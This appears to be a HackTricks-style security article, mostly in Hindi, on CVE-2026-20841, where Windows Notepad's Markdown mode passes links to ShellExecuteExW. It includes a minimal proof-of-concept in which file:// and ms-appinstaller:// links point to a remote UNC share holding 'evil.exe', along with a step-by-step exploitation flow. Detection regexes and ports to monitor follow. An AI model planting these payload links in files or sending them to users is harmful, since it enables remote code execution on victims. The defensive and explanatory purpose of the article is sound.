# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

आधुनिक Windows applications जो Markdown/HTML render करती हैं, अक्सर user-supplied links को clickable elements में बदलकर `ShellExecuteExW` को सौंप देती हैं। Strict scheme allowlisting के बिना, कोई भी registered protocol handler (जैसे `file:`, `ms-appinstaller:`) trigger किया जा सकता है, जिससे current user context में code execution हो सकता है।<sup>[[1]](#references)</sup>

## Windows Notepad Markdown mode में ShellExecuteExW surface
- Notepad `sub_1400ED5D0()` में fixed string comparison के माध्यम से **केवल `.md` extensions** के लिए Markdown mode चुनता है।<sup>[[1]](#references)</sup>
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (इसे `[target](target)` के रूप में render किया जाता है), इसलिए payloads और detections के लिए दोनों syntaxes महत्वपूर्ण हैं।
- Link clicks को `sub_140170F60()` में process किया जाता है, जो weak filtering करता है और फिर `ShellExecuteExW` को call करता है।
- `ShellExecuteExW` केवल HTTP(S) ही नहीं, बल्कि **किसी भी configured protocol handler** को dispatch करता है।<sup>[[1]](#references)</sup>

### Payload से संबंधित बातें
- Link में मौजूद कोई भी `\\` sequences `ShellExecuteExW` से पहले `\` में **normalize** की जाती हैं, जिससे UNC/path crafting और detection प्रभावित होते हैं।
- `.md` files default रूप से Notepad से associated **नहीं** होतीं; victim को अभी भी file को Notepad में खोलकर link पर click करना होगा, लेकिन render होने के बाद link clickable होता है।
- Dangerous example schemes:<sup>[[1]](#references)</sup>
- `file://` का उपयोग local/UNC payload launch करने के लिए।
- `ms-appinstaller://` का उपयोग App Installer flows trigger करने के लिए। अन्य locally registered schemes का भी abuse किया जा सकता है।

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. एक **`.md` file** तैयार करें ताकि Notepad उसे Markdown के रूप में render करे।
2. एक खतरनाक URI scheme (`file:`, `ms-appinstaller:`, या कोई भी installed handler) का उपयोग करके link embed करें।
3. File को (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB या समान माध्यम से) deliver करें और user को इसे Notepad में open करने के लिए convince करें।
4. Click करने पर, **normalized link** `ShellExecuteExW` को सौंपा जाता है और संबंधित protocol handler user के context में referenced content को execute करता है।<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- `.md` files को उन ports/protocols पर transfer किए जाने की निगरानी करें जो आमतौर पर documents deliver करते हैं: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown links (standard और autolink) को parse करें और **case-insensitive** `file:` या `ms-appinstaller:` खोजें।
- Remote resource access को पकड़ने के लिए vendor-guided regexes:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Patch behavior reportedly **local files और HTTP(S) को allowlist करता है**; `ShellExecuteExW` तक पहुँचने वाली कोई भी अन्य चीज़ suspicious है। आवश्यकतानुसार अन्य installed protocol handlers के लिए detections बढ़ाएँ, क्योंकि attack surface system के अनुसार अलग-अलग होता है।<sup>[[1]](#references)</sup>

## संदर्भ
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
